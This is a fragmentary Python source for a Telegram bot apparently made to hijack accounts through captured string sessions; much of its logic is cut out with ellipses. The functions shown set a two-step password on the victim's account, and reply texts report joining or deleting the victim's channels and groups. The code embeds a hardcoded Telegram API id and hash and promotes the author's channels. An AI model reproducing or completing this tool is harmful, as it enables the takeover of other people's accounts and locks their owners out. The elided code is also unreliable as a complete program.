...
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    try:
      await X.edit_2fa('aakash IS BEST')
      return True
    except:
      return False
...
'''
mm = '''
**⚜NOTICE FIRST JOIN AAKASH'S GROUP @GFC_SUPPORT⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/WTFAAKASHXD")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/GFC_C0MMUNITY")
        ]
      ]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Joined the Channel/Group Thanks.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("Deleted the Channel/Group Thanks.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply("User don't have two step thats why now two step is `FINER X (AAKASH) IS OP` you can login now\n\nThanks For using LegendBoy Bot.", buttons=keyboard)
      else:
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @GFC_SUPPORT\n**LOGS**\n" + str(e))
